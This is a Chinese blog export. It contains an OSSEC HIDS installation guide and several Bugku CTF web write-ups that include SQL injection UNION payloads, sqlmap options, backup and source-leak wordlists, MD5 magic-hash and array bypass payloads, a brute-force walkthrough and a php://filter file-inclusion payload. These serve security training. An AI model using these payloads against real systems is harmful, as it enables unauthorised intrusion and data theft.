出现安装向导，选择语言（确保安装了C编译器）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107which: no host in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin) ** Para instalação em português, escolha [br]. ** 要使用中文进行安装, 请选择 [cn]. ** Fur eine deutsche Installation wohlen Sie [de]. ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el]. ** For installation in English, choose [en]. ** Para instalar en Español , eliga [es]. ** Pour une installation en français, choisissez [fr] ** A Magyar nyelvű telepítéshez válassza [hu]. ** Per l'installazione in Italiano, scegli [it]. ** 日本語でインストールします．選択して下さい．[jp]. ** Voor installatie in het Nederlands, kies [nl]. ** Aby instalować w języku Polskim, wybierz [pl]. ** Для инструкций по установке на русском ,введите [ru]. ** Za instalaciju na srpskom, izaberi [sr]. ** Türkçe kurulum için seçin [tr]. (en/br/cn/de/el/es/fr/hu/it/jp/nl/pl/ru/sr/tr) [en]: enwhich: no host in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin) OSSEC HIDS v2.8 Installation Script - http://www.ossec.net You are about to start the installation process of the OSSEC HIDS. You must have a C compiler pre-installed in your system. If you have any questions or comments, please send an e-mail to dcid@ossec.net (or daniel.cid@gmail.com). - System: Linux Server 3.10.0-957.5.1.el7.x86_64 - User: root - Host: Server -- Press ENTER to continue or Ctrl-C to abort. --1- What kind of installation do you want (server, agent, local, hybrid or help)? server - Server installation chosen.2- Setting up the installation environment. - Choose where to install the OSSEC HIDS [/var/ossec]: - Installation will be made at /var/ossec .3- Configuring the OSSEC HIDS. 3.1- Do you want e-mail notification? (y/n) [y]: y - What's your e-mail address? 123456@qq.com - What's your SMTP server ip/host? 127.0.0.1 3.2- Do you want to run the integrity check daemon? (y/n) [y]: y - Running syscheck (integrity check daemon). 3.3- Do you want to run the rootkit detection engine? (y/n) [y]: y - Running rootcheck (rootkit detection). 3.4- Active response allows you to execute a specific command based on the events received. For example, you can block an IP address or disable access for a specific user. More information at: http://www.ossec.net/en/manual.html#active-response - Do you want to enable active response? (y/n) [y]: y - Active response enabled. - By default, we can enable the host-deny and the firewall-drop responses. The first one will add a host to the /etc/hosts.deny and the second one will block the host on iptables (if linux) or on ipfilter (if Solaris, FreeBSD or NetBSD). - They can be used to stop SSHD brute force scans, portscans and some other forms of attacks. You can also add them to block on snort events, for example. - Do you want to enable the firewall-drop response? (y/n) [y]: y - firewall-drop enabled (local) for levels &gt;= 6 - Default white list for the active response: - 202.96.134.133 - 202.96.128.86 - Do you want to add more IPs to the white list? (y/n)? [n]: y - IPs (space separated): 192.168.0.120 3.5- Do you want to enable remote syslog (port 514 udp)? (y/n) [y]: y - Remote syslog enabled. 3.6- Setting the configuration to analyze the following logs: -- /var/log/messages -- /var/log/secure -- /var/log/maillog -- /var/log/httpd/error_log (apache log) -- /var/log/httpd/access_log (apache log) - If you want to monitor any other file, just change the ossec.conf and add a new localfile entry. Any questions about the configuration can be answered by visiting us online at http://www.ossec.net . --- Press ENTER to continue --- 安装完成后，配置服务端，使其工作正常执行命令启用数据库支持1/var/ossec/bin/ossec-control enable database 导入MySQL表结构到MySQL数据库中1mysql -uossec -p ossec &lt; ossec-hids-2.8.1/src/os_dbd/mysql.schema 编辑ossec.conf文件，在&lt;ossec_config&gt;中添加mysql配置1234567&lt;database_output&gt; &lt;hostname&gt;127.0.0.1&lt;/hostname&gt; &lt;username&gt;ossec&lt;/username&gt; &lt;password&gt;ossec&lt;/password&gt; &lt;database&gt;ossec&lt;/database&gt; &lt;type&gt;mysql&lt;/type&gt;&lt;/database_output&gt; 由于服务端安装时，设置了支持接收远程机器的syslog，所有需要对ossec.conf文件中syslog部分进行添加配置，将需要的收集的网段进行添加。1&lt;allowed-ips&gt;192.168.0.0/24&lt;/allowed-ips&gt; 重新启动ossec服务使其配置生效 添加客户端并导出Key1/var/ossec/bin/manage_agents OSSEC客户端安装客户端1(agent1)安装1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#安装gcc* wgetyum install wget gcc* -y#下载ossecwget https://github.com/alixiaowei/ossec/blob/master/ossec-hids-2.8.1.tar.gz?raw=true#解压tar -xzf ossec-hids-2.8.1.tar.gz\?raw\=true#安装ossec-hids-2.8.1/install.sh#安装向导[root@Agent ~]# ossec-hids-2.8.1/install.sh which: no host in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin) ** Para instalação em português, escolha [br]. ** 要使用中文进行安装, 请选择 [cn]. ** Fur eine deutsche Installation wohlen Sie [de]. ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el]. ** For installation in English, choose [en]. ** Para instalar en Español , eliga [es]. ** Pour une installation en français, choisissez [fr] ** A Magyar nyelvű telepítéshez válassza [hu]. ** Per l'installazione in Italiano, scegli [it]. ** 日本語でインストールします．選択して下さい．[jp]. ** Voor installatie in het Nederlands, kies [nl]. ** Aby instalować w języku Polskim, wybierz [pl]. ** Для инструкций по установке на русском ,введите [ru]. ** Za instalaciju na srpskom, izaberi [sr]. ** Türkçe kurulum için seçin [tr]. (en/br/cn/de/el/es/fr/hu/it/jp/nl/pl/ru/sr/tr) [en]: enwhich: no host in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin) OSSEC HIDS v2.8 Installation Script - http://www.ossec.net You are about to start the installation process of the OSSEC HIDS. You must have a C compiler pre-installed in your system. If you have any questions or comments, please send an e-mail to dcid@ossec.net (or daniel.cid@gmail.com). - System: Linux Agent 3.10.0-957.el7.x86_64 - User: root - Host: Agent -- Press ENTER to continue or Ctrl-C to abort. --1- What kind of installation do you want (server, agent, local, hybrid or help)? agent - Agent(client) installation chosen.2- Setting up the installation environment. - Choose where to install the OSSEC HIDS [/var/ossec]: - Installation will be made at /var/ossec .3- Configuring the OSSEC HIDS. 3.1- What's the IP Address or hostname of the OSSEC HIDS server?: 192.168.0.120 - Adding Server IP 192.168.0.120 3.2- Do you want to run the integrity check daemon? (y/n) [y]: y - Running syscheck (integrity check daemon). 3.3- Do you want to run the rootkit detection engine? (y/n) [y]: y - Running rootcheck (rootkit detection). 3.4 - Do you want to enable active response? (y/n) [y]: y 3.5- Setting the configuration to analyze the following logs: -- /var/log/messages -- /var/log/secure -- /var/log/maillog - If you want to monitor any other file, just change the ossec.conf and add a new localfile entry. Any questions about the configuration can be answered by visiting us online at http://www.ossec.net . --- Press ENTER to continue --- 客户端导入服务端生成的key1/var/ossec/bin/manage_agents 客户端2(agent2)安装下载ossec客户端1https://github.com/alixiaowei/ossec/blob/master/ossec-agent-win32-2.8.zip?raw=true 解压并安装 客户端导入服务端生成的key OSSEC服务端查看状态1/var/ossec/bin/agent_control -lc OSSEC-SERVER安装第三方WEB界面12345678#下载ossec-wui-0.9wget -O /var/www/html/ossec-wui-0.9.tar.gz https://github.com/alixiaowei/ossec/blob/master/ossec-wui-0.9.tar.gz?raw=true#解压并重新命名cd /var/www/html/tar -xzf ossec-wui-0.9.tar.gzmv ossec-wui-0.9 ossec#安装ossec/setup.sh 实现目录保护(需要密码访问)创建/etc/httpd/conf.d/ossec.conf文件添加配置12345678Alias ossec/ "/var/www/html/ossec/"&lt;Directory "/var/www/html/ossec/"&gt;AuthName "OSSEC AUTH"Require valid-userAuthType BasicAuthUserFile /var/www/html/ossec/.htpasswd&lt;/Directory&gt; 12#重启httpd服务service httpd restart 常用命令123456/var/ossec/bin/ossec-control restart 重启ossec服务netstat -tuanp 查看端口/var/ossec/bin/agent_control -lc 查看状态/var/ossec/ossec-logtest 用于测试OSSEC的泛化及告警规则更多可以进入/bin目录查看... 配置文件123456789101112131415161718192021222324252627282930313233343536373839#核心配置文件ossec.conf ossec hids主要配置文件internal_options.conf： 额外配置选项文件decoders.xml： 文件解码器，各种规则都在这里写来调用client.keys： 用于客户端与服务器认证通信/var/ossec/bin 目录包含ossec hids使用的二进制文件/var/ossec/etc 目录包含所有ossec hids使用的配置文件#日志文件/var/ossec/logs 包含有关ossec hids所有的日志目录ossec.log 包含osse hids所有日志(error,warn,info和其他)alerts/alerts.log ossec hids报警日志active-responses.log ossec hids响应日志#队列/var/ossec/queue 目录包含ossec hids队列文件agent-info 目录包含操作系统版本、ossec hids版本等信息syscheck 目录包含每个agent的数据校验日志rootcheck 目录包含每个agent，rootkit检查数据和监控规则。rids 目录包含agent ids信息#规则/var/ossec/rules 目录包含所有osse hids规则... 参考文档：http://www.ossec.net/https://ossec-docs.readthedocs.io/en/latest/manual/rules-decoders/create-custom.htmlhttps://www.freebuf.com/articles/system/11862.html]]></content>
      <categories>
        <category>OSSEC</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Centos7</tag>
        <tag>OSSEC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7更换软件安装源]]></title>
    <url>%2F2019%2F03%2F12%2F201936%2F</url>
    <content type="text"><![CDATA[阿里云Linux安装镜像源地址：https://opsx.alibaba.com/mirror Centos7更换阿里云安装镜像源备份原有的镜像文件，以免出错时可以恢复1cp /etc/yum.repos.d/CentOS-Base.repo&#123;,.backup&#125; 下载更新的源文件(CentOS-Base.repo)到/etc/yum.repos.d/12345# 升级所有包以及升级软件和系统内核# --skip-broken 忽略包的依赖问题yum update --skip-broken -y #安装wgetyum install wget -y 更新下载源1234# CentOS 7# wget -O 下载并以不同的文件名保存# wget默认会以最后一个符合”/”的后面的字符来命名wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 生成新的缓存1234# 清除缓存yum clean all# 建立缓存yum makecache 中国开源镜像网站12345网易开源镜像站：http://mirrors.163.com/阿里云开源镜像站：http://mirrors.aliyun.com/清华大学：http://mirrors.tuna.tsinghua.edu.cn/东软信息学院:http://mirrors.neusoft.edu.cn/...]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Centos7</tag>
        <tag>yum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[暂停更新]]></title>
    <url>%2F2019%2F02%2F15%2F201935%2F</url>
    <content type="text"><![CDATA[最近因为要比赛了 暂定更新先比赛后再更新]]></content>
      <categories>
        <category>通知</category>
      </categories>
      <tags>
        <tag>通知</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-速度要快]]></title>
    <url>%2F2019%2F02%2F03%2F201934%2F</url>
    <content type="text"><![CDATA[速度要快-writeup打开题目访问链接，查看审查元素，提示这里感觉需要post提交一些什么东西利用burp suite进行抓包看看，在response中headers发现了一串base64进行base64解密解出来感觉还是怪怪的，感觉还是base64，进行再次解密 将解密出来的进行提交，提交失败，想到源代码中的注释，post提交看一下提示我（都说了让你快点。。。）然后几次尝试发现每次headers中的base64在变化,发现PHPSESSID字段应该是要post提交保持同一个会话写python进行post提交123456789101112131415161718# coding: utf-8# 导入模块import requestsimport base64url = 'http://123.206.87.240:8002/web6/' # 链接convert = requests.session() # 创建会话对象（保持cookie）html = convert.get(url) # get请求head = html.headers['flag'] # 获取头部flag信息decode_1 = base64.b64decode(head) # 进行base64解密code = decode_1.decode('utf-8') # bytes转stringseparate = code.split(':') # 将base64解密后的字符串进行以‘：’进行分隔，获取flag后面的值decode_2 = base64.b64decode(separate[1]) # 返回分隔后的字符串列表，将解密后的进行二次base64解密flag = convert.post(url, data=&#123;'margin': decode_2&#125;) # 构造margin参数post提交print(flag.text)]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-秋名山老司机]]></title>
    <url>%2F2019%2F02%2F02%2F201933%2F</url>
    <content type="text"><![CDATA[秋名山老司机-writeup打开题目，秋名山老司机来飙车吗？访问链接，发现是一道计算题，算了下，2s?这道题明显要求计算响应内容中的表达式并POST请求正确的信息返回结果，还是快速反弹POST请求这里会纳闷传值传给谁，刷新了几下发现提示Give me value post about直接写python1234567891011121314# coding: utf-8# 导入模块import requestsimport reurl = 'http://123.206.87.240:8002/qiumingshan/' # 链接convert = requests.Session() # 创建session对象，session对象可以使我们跨请求保持某些参数，也可以在同一个session实例发出的所有请求之间保持cookieshtml = convert.get(url).text # get请求reg = re.compile(r'(?&lt;=&lt;div&gt;).*(?=\=)').findall(html) #匹配表达式如['2024653276+1430867578+1152697161*392577551-1429779315*779503901+1352271449+1584130862+557093247+1523782933+1160059856']payload = &#123;'value': eval(reg[0])&#125; # eval计算式子(匹配出来的是列表)并构造post请求的data部分flag = convert.post(url, data=payload) # post带参数提交flag.encoding = 'utf-8' #'utf-8'格式print(flag.text) 这个因为是2s的原因，要结合环境（程序自身的的运行时间、网速等因素）也有可能python的计算与服务端的计算有误差，导致出现了要一定的概率才会出现flag，（触及到我的知识盲区-_-!）多尝试几次。可以加个while True 循环，亦或者加个多线程并发。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式之零宽断言]]></title>
    <url>%2F2019%2F02%2F01%2F201932%2F</url>
    <content type="text"><![CDATA[正则表达式之零宽断言零宽断言:用于查找特定内容之前或之后的内容，但并不包括特定内容本身。断言用来声明一个应该为真的事实。正则表达式中只有当断言为真时才会继续进行匹配。简单来说就是匹配一个位置，这个位置满足某个正则，但不纳入结果的，所以叫“零宽断言”，而且这个位置的前面或后面需要满足某种正则。 分类 代码/语法 说明 零宽度正预测先行断言 (?=exp) 匹配exp前面的位置 零宽度正回顾后发断言 (?&lt;=exp) 匹配exp后面的位置 零宽度负预测先行断言 (?!exp) 匹配后面跟的不是exp的位置 零宽度负回顾后发断言 (?&lt;!exp) 匹配前面不是exp的位置 下面结合例子来理解下什么是零宽断言。零宽断言123正则表达式:(?&lt;=&lt;div&gt;).*(?=&lt;/div&gt;) 匹配字符串:&lt;div&gt;www.axiaowei.cn&lt;/div&gt; 匹配结果:www.axiaowei.cn 123正则表达式：(?&lt;=&lt;div&gt;).*匹配字符串:&lt;div&gt;www.axiaowei.cn&lt;/div&gt; 匹配结果:www.axiaowei.cn&lt;/div&gt; 123正则表达式：(?=www).*(?&lt;=cn)匹配字符串：&lt;div&gt;www.axiaowei.cn&lt;/div&gt; 匹配结果:www.axiaowei.cn 负向零宽断言123正则表达式：\d&#123;3&#125;(?!\d) -&gt;匹配三位数字的后面不能是数字匹配字符串：235456123匹配结果：123 123正则表达式：(?&lt;![a-z])\d&#123;7&#125; -&gt;匹配前面不是小写字母的七位数字匹配字符串：1111111d2222222d3333333S4444444匹配结果：1111111, 4444444 这里举一个常见的简单计算题，我们利用零宽断言进行匹配。三秒中算出式子（每次刷新式子也会变化），想必能算出来输入提交也超过三秒了吧，直接写python123456789101112131415161718# coding: utf-8import reimport requestsurl = 'http://123.206.31.85:10002/'convert = requests.session()html = convert.get(url).textreg = re.compile(r'.+(?=&lt;/p&gt;)').findall(html) # 零宽断言匹配link = ''for i in reg: link += idata = eval(link)post = convert.post(url, &#123;'result': data&#125;)print('三秒之内计算出以下式子：\n', link, '=', data)print(post.text) 参考资料：http://deerchao.net/tutorials/regex/regex.htm]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>re</tag>
        <tag>regex</tag>
        <tag>零宽断言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-成绩单]]></title>
    <url>%2F2019%2F02%2F01%2F201931%2F</url>
    <content type="text"><![CDATA[成绩单-writeup打开题目访问链接，根据上面提示分别输入1,2,3查询下尝试输入1’返回异常，输入1’#返回正常，判断存在注入尝试手动注入利用order by 判断列数为4列11'order by 4 # 返回正常 11'order by 5 # 返回异常 12利用联合查询查看显位payload:-1'union select 1,2,3,4 # 12爆库名paylaod:-1'union select 1,database(),3,4 # 12爆表名payload:-1'union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()# 12爆字段payload:-1'union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name='fl4g'# 12查询数据payload:-1'union select 1,group_concat(skctf_flag),3,4 from fl4g# 还可以使用sqlmap进行burp suite抓包，右键保存文件将文本放在sqlmap的当前目录下，打开sqlmap爆库爆表名爆字段爆字段信息123456789101112Sqlmap命令参数-r 是读文件 后面是刚才保存的绝对路径-p 是参数，也就是注入点（选了id是注入点）-D 是表示选择了后面的这个数据库 -T 指定表-C 指定要爆的字段--dbs –&gt;获取数据库名称--current-db –&gt;获取当前数据库名称--tables –&gt;获取表--columns –&gt;获取字段--dump –&gt;将结果导出 1234567891011121314151617181920212223242526272829303132333435Mysql数据库information_schema系统表说明:SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。COLLATIONS表：提供了关于各字符集的对照信息。COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。KEY_COLUMN_USAGE表：描述了具有约束的键列。ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表详情可以点击:https://wenku.baidu.com/view/6358a5fd89eb172ded63b7a8.html]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Mysql</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP语法]]></title>
    <url>%2F2019%2F01%2F31%2F201930%2F</url>
    <content type="text"><![CDATA[php语法strstr() 函数搜索字符串在另一字符串中的第一次出现。语法strstr(string,search,before_search) 参数 描述 string 必需。规定被搜索的字符串。 search 必需。规定所搜索的字符串。如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。 before_search 可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。 实例:123&lt;?phpecho strstr("axiaowei.cn?key1=1",'?');?&gt; substr() 函数返回字符串的一部分。语法substr(string,start,length) 参数 描述 string 必需。规定要返回其中一部分的字符串。 start 必需。规定在字符串的何处开始。正数-在字符串的指定位置开始负数-在从字符串结尾开始的指定位置开始。0-在字符串中的第一个字符处开始 length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数-从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 实例123&lt;?phpecho substr("www.axiaowei.cn",4);?&gt; str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。语法str_replace(find,replace,string,count) 参数 描述 find 必需。规定要查找的值 replace 必需。规定替换find中的值的值 string 必需。规定被搜索的字符串 count 可选。对替换数进行计数的变量 实例123&lt;?phpecho str_replace("world","xiaowei blog","Hello world!");?&gt; parse_str() 函数把查询字符串解析到变量中。语法parse_str(string,array) 参数 描述 string 必需。规定解析的字符串 array 可选。规定存储变量的数组名称。该参数指示变量将被存储到数组中 实例123456&lt;?phpparse_str("key1=xiaowei&amp;key2=2019");echo $key1;echo "\n";echo $key2;?&gt; $_SERVER[“REQUEST_URI”]函数1234567$_SERVER["REQUEST_URI"]函数预定义服务器变量的一种，所有$_SERVER开头的都叫做预定义服务器变量 REQUEST_URI的作用是取得当前URI，也就是除域名外后面的完整的地址路径例如：当前页面是http://www.axiaowei.cn/plus/search.php?kwtype=0&amp;keyword=php&amp;searchtype=titlekeywordecho $_SERVER["REQUEST_URI"];结果就为：plus/search.php?kwtype=0&amp;keyword=php&amp;searchtype=titlekeyword]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-备份是个好习惯]]></title>
    <url>%2F2019%2F01%2F31%2F201929%2F</url>
    <content type="text"><![CDATA[备份是个好习惯-writeup打开题目访问链接，给出一串md5值，尝试去md5解密一下，空密码根据题目提示，直接上御剑扫描(或者可以尝试常见的几个源码泄露)附常见的源码泄露、备份文件List123456789101112131415161718192021222324252627282930313233343536373839404142434445.git.git/HEAD.git/index.git/config.git/descriptionREADME.MDREADME.mdREADME.gitignore.svn.svn/wc.db.svn/entries.hg.ds_storeWEB-INF/web.xmlWEB-INF/src/WEB-INF/classesWEB-INF/libWEB-INF/database.propertieCVS/RootCVS/Entries.bzr/??~.?.swp.?.swo.?.swn.?.swm.?.swl_viminfo.viminfo?~?~1~?~2~?~3~?.save?.save1?.save2?.save3?.bak_Edietplus?.bak?.backphpinfo.phptest.php.bash_history File123456789101112131415161718index.phplogin.phpregister.phptest.phpphpinfo.phpt.phpwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tar 下载得到一个源码1234567891011121314151617181920&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php"; //脚本执行期间包含并运行指定文件(只包含一次)ini_set("display_errors", 0); //不显示错误报告$str = strstr($_SERVER['REQUEST_URI'], '?'); //搜索当前url值中？(包含？)后边的字符串赋值给变量str$str = substr($str,1); //str中的第二个字符开始(含)，返回后面的字符串赋值给变量str$str = str_replace('key','',$str); //在str中查找key，并将其替换为空parse_str($str); //将str解析到变量中echo md5($key1); //将md5($key1)写入输出echo md5($key2); //将md5($key2)写入输出if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125; //判断MD5加密后的key1值等于MD5加密后的key2值且key1的值不等于key2的值，成立输出flag?&gt; 可参考PHP语法现在我们对代码审计完后方法一构造payload：http://123.206.87.240:8002/web16/?kkeyey1[]=123&amp;kkeyey2[]=4561234md5()中需要传入的是一个string类型的参数，当我们传递一个数组时，它是不会报错的，函数无法求出数组的MD5值，这样导致任意两个数组的MD5值都相等，从而绕过输入数值的判断。md5算法比较数组会返回NULL，也就是等值。这里注意的是:$str = str_replace('key','',$str); 将key替换为空所以这里需要利用到重写(kkeyey)绕过 方法二构造payload：http://123.206.87.240:8002/web16/?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a12345678910==是比较运算，它不会去检查条件式的表达式的类型===是恒等，它会检查查表达式的值与类型是否相等。PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0（遇到0e\d+这种字符串，就会将这种字符串解析为科学计数法），所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MD5</tag>
        <tag>bak</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-点击一百万次]]></title>
    <url>%2F2019%2F01%2F30%2F201928%2F</url>
    <content type="text"><![CDATA[点击一百万次-writeup打开题目访问链接，看来是要你点击一百万次，点了几下，好了我放弃了查看审查元素发现一串JavaScript12345678910111213141516var clicks=0 //声明一个clicks定位为0$(function() &#123; //$(document).ready(function() &#123; ... &#125;);的缩写，防止文档在完全加载（就绪）之前运行 jQuery 代码。如果在文档没有完全加载之前就运行函数，操作可能失败。其作用和 $(document).ready()一樣 ，用意在DOM載入後執行ready()方法。 $("#cookie").mousedown(function() &#123; //鼠标按下事件 $(this).width('350px').height('350px'); //$(this)代码代表$('#cookie)，鼠标按下之后id为cookie的元素改变宽度和高度 &#125;).mouseup(function() &#123; //鼠标松开事件 $(this).width('375px').height('375px'); //鼠标松开之后id为cookie的元素改变宽度和高度 clicks++; //clicks增加 $("#clickcount").text(clicks); //clicks++完给id为clickcount元素改变值 if(clicks &gt;= 1000000)&#123; //当clicks大于或等于1000000，声明一个form，并在body追加form var form = $('&lt;form action="" method="post"&gt;' + '&lt;input type="text" name="clicks" value="' + clicks + '" hidden/&gt;' +'&lt;/form&gt;'); //定义html代码 $('body').append(form); //在body插入html代码 form.submit(); //执行form表单提交 &#125; &#125;);&#125;); 打开浏览器Console提交clicks=999999，再点击一次页面也可以利用hackbar直接post提交clicks=1000000还有很多种方式，大家可以一一尝试下，只要将clicks值达到满足判断条件即可。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-输入密码查看flag]]></title>
    <url>%2F2019%2F01%2F29%2F201927%2F</url>
    <content type="text"><![CDATA[输入密码查看flag-writeup打开题目访问链接，尝试输入12345，提示密码错误，利用burp suite爆破（题目已经给出提示）设置代理，在浏览器中随便输入五位数字，打开burp suite抓包，发送到Intruder在Intruder中Positions中选择Clear清除，将12345选中选择Add添加在Payloads设置好相应参数，数字类型、10000-99999，步长为1在Options选项中设置线程（看电脑性能）点击Start attack开始，过一会就出来了（正确密码与错误密码Length长度是有区别的）将密码输入浏览器中，点击查看，得到flag]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-flag在index里]]></title>
    <url>%2F2019%2F01%2F29%2F201926%2F</url>
    <content type="text"><![CDATA[flag在index里-writeup打开题目访问链接，页面显示click me? no 点击进去显示test5这里我们看到url中含有file关键字题目提示我们flag在index中，通过分析，这里发送了file为key，show.php为value的get请求ctf常见的套路-php文件包含漏洞12345&lt;?php $file=$_GET['file']; ... include($file); ?&gt; 12php://-访问各个输入/输出流（I/O streams）PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 12php://filterphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 名称 描述 resource=&lt;要过滤的数据流&gt; 指定你要筛选过滤的数据流 read=&lt;读链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符(&#124;)分隔 write=&lt;写链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符(&#124;)分隔 &lt;; 两个链的筛选列表&gt; 任何没有以read=或write作前缀的筛选列表会视情况应用于读或写链 利用这个协议我们可以解决一些ctf的题目，或者挖掘出一些漏洞。构造payload：http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php12345678910111213141516171819202122php支持得伪协议file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流read参数值可为string.strip_tags 将数据流中的所有html标签清除string.toupper 将数据流中的内容转换为大写string.tolower 将数据流中的内容转换为小写convert.base64-encode 将数据流中的内容转换为base64编码convert.base64-decode 与上面对应解码resource=[文件路径] 